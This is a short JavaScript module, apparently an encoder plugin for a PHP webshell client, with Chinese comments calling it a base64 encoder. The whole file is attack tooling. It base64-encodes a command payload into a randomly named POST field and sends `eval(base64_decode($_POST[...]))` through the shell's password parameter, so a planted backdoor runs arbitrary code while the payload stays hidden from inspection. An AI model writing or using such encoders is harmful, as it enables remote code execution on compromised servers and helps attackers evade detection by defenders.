/**
 * php::base64编码器
 * ? 利用php的base64_decode进行编码处理
 */

'use strict';

module.exports = (pwd, data) => {
  // 生成一个随机变量名
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = new Buffer(data['_']).toString('base64');
  data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
  delete data['_'];
  return data;
}
